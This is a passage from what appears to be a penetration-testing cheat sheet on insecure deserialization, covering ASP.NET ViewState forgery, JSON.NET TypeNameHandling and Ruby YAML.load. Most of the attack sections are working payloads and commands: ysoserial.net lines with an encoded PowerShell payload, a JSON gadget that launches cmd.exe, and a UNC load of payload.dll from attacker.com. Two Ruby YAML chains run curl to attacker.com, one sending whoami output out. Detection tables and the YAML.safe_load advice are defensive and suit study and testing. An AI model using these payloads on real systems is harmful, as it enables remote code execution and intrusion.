5. Azure App Service: sometimes in `WEBSITE_AUTH_ENCRYPTION_KEY` env var

### 4.3 ViewState Forgery

```bash
# With known machineKey — generate malicious ViewState:
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64_PAYLOAD" \
  --path="/target-page.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY_HEX" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX" \
  --islegacy

# Without encryption (enableViewStateMac=false or older .NET):
ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "cmd /c whoami > C:\out.txt" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX"
```

### 4.4 ViewState Attacks Without machineKey

```
# .NET Framework < 4.5 with enableViewStateMac="false" in web.config:
# No MAC → directly craft malicious ViewState

# Blacklist3r tool: try known/default keys:
Blacklist3r.exe --viewstate "BASE64_VIEWSTATE" --path "/page.aspx" --apppath "/"
# Tests common validation/decryption key pairs

# ASP.NET __VIEWSTATEGENERATOR value:
# Helps identify the target page's ViewState key derivation
# Format: 8 hex chars in hidden field
```

### 4.5 JSON.NET TypeNameHandling Exploitation

```json
// Vulnerable configuration:
// JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
//     TypeNameHandling = TypeNameHandling.All  // or Auto, Objects, Arrays
// });

// Payload — ObjectDataProvider chain:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}

// Alternative: System.Configuration.Install.AssemblyInstaller
// Triggers assembly load from attacker-controlled path
{
  "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
  "Path": "\\\\attacker.com\\share\\payload.dll"
}
```

---

## 5. RUBY YAML.load vs YAML.safe_load

### 5.1 Why YAML.load Is Dangerous

`YAML.load` in Ruby constructs arbitrary Ruby objects via `!ruby/object:` tags. It is equivalent to `Marshal.load` or Java's `ObjectInputStream.readObject()` in terms of attack surface.

### 5.2 Version-Specific Exploits

**Ruby ≤ 2.7.2** — `Gem::Requirement` chain (simplest):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| curl http://attacker.com/pwned"
```

**Ruby 2.x–3.x** — `Gem::Installer` chain (complex but broader):

```yaml
--- !ruby/hash:Gem::Installer
i: x
--- !ruby/hash:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: "curl http://attacker.com/$(whoami)"
      method_id: :resolve
```

### 5.3 Detection in the Wild

```ruby
# Vulnerable patterns in source code:
YAML.load(user_input)
YAML.load(File.read(user_controlled_path))
YAML.load(params[:config])

# Safe alternatives:
YAML.safe_load(input)
YAML.safe_load(input, permitted_classes: [Symbol, Date])
Psych.safe_load(input)
```

### 5.4 Psych YAML Parser Versions

| Ruby Version | Psych Version | YAML.load Behavior |
|---|---|---|
| ≤ 2.0 | Psych 2.x | Arbitrary object construction |
| 2.1–2.7 | Psych 3.x | Arbitrary (YAML.load deprecated warning in 2.6+) |
| 3.0 | Psych 3.3 | YAML.load warns, still works |
| 3.1+ | Psych 4.0 | YAML.load defaults to safe_load behavior; need `unsafe_load` |

---

## 6. DETECTION FINGERPRINTS — MAGIC BYTES TABLE

### 6.1 By Protocol / Format

| Magic Bytes (Hex) | Base64 Prefix | Format | Language |
|---|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java Serialized Object | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | .NET |
| `FF 01` | `/w` | .NET ObjectStateFormatter (ViewState) | .NET |
| `80 02` or `80 03` or `80 04` or `80 05` | Varies | Python pickle (protocol 2/3/4/5) | Python |
| `89 50 4E 47` | `iVBOR` | PNG (may contain phar polyglot) | PHP |
| `4F 3A` | `Tz` (base64 of `O:`) | PHP serialized object (`O:N:"Class"`) | PHP |
| `61 3A` | `YT` (base64 of `a:`) | PHP serialized array (`a:N:{`) | PHP |
| `04 08` | Varies | Ruby Marshal | Ruby |
| `1F 8B` | `H4s` | Gzip (may wrap serialized data) | Any |
| `48 02` or `63` | Varies | Hessian (2.0 / 1.0) | Java |

### 6.2 By Content-Type Header

| Content-Type | Likely Format | Risk |
|---|---|---|
| `application/x-java-serialized-object` | Java ObjectOutputStream | Critical |
| `application/x-java-serialized-object-xml` | XMLEncoder/XMLDecoder | Critical |
| `x-application/hessian` | Hessian binary | Critical |
| `application/x-hessian` | Hessian binary | Critical |
| `application/x-amf` | AMF (Flash) — often wraps Java | High |
| `application/x-yaml` / `text/yaml` | YAML (check for `!!` tags) | High (if YAML.load) |
| `application/java-archive` | JAR file | Context-dependent |
| `application/x-protobuf` | Protobuf (generally safe) | Low |
| `application/json` with `$type` | JSON.NET with TypeNameHandling | Critical |
| `application/xml` with suspicious elements | XStream / XMLDecoder | Critical |

### 6.3 By Cookie / Parameter Name

| Name Pattern | Likely Format | Product |
|---|---|---|
| `rememberMe` | Java serialized + AES | Apache Shiro |
| `__VIEWSTATE` | .NET ObjectStateFormatter | ASP.NET WebForms |
| `__EVENTTARGET` | .NET (associated with ViewState) | ASP.NET WebForms |
| `JSESSIONID` + binary cookie | Java serialized | Various Java servers |
| `rack.session` | Ruby Marshal (base64) | Ruby on Rails / Rack |
| `_session_id` + binary | Python pickle or JSON | Django / Flask |
| `connect.sid` | Node.js session (usually JSON, but check) | Express |
| `ci_session` | PHP serialized | CodeIgniter |
| `PHPSESSID` + serialized data | PHP serialized | PHP applications |

### 6.4 Quick Identification Script

```bash
# Check if base64-decoded data matches known magic bytes:
echo "BASE64_DATA" | base64 -d | xxd | head -1

# Java: look for "ac ed 00 05"
# .NET BinaryFormatter: look for "00 01 00 00 00 ff ff ff ff"
# Python pickle: look for "80 0N" where N is protocol version
# PHP: decode and look for "O:" or "a:" prefix
```

---

## 7. TOOLING QUICK REFERENCE

| Tool | Language | Purpose |
|---|---|---|
| **ysoserial** | Java | Java gadget chain payload generation |
| **ysoserial.net** | .NET | .NET gadget chain payload generation |
| **marshalsec** | Java | Hessian, XStream, JNDI, multiple format payloads |
| **PHPGGC** | PHP | PHP gadget chain generation (Laravel, Symfony, etc.) |
| **pimpmykali/ysoserial-modified** | Java | Extended ysoserial with more chains |
| **GadgetInspector** | Java | Automated gadget chain discovery in classpaths |
| **Blacklist3r** | .NET | ViewState key testing and forging |
| **SerializationDumper** | Java | Decode and inspect Java serialized objects |
| **jdeserialize** | Java | Parse Java serialization stream for analysis |

```bash
# ysoserial — try all chains with DNS callback:
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Spring2 \
  Groovy1 Hibernate1 Jdk7u21 URLDNS; do
  java -jar ysoserial.jar $chain "http://${chain}.TOKEN.collab.net" 2>/dev/null | \
    base64 -w0 > "${chain}.b64"
  echo "Generated: ${chain}"
done
```
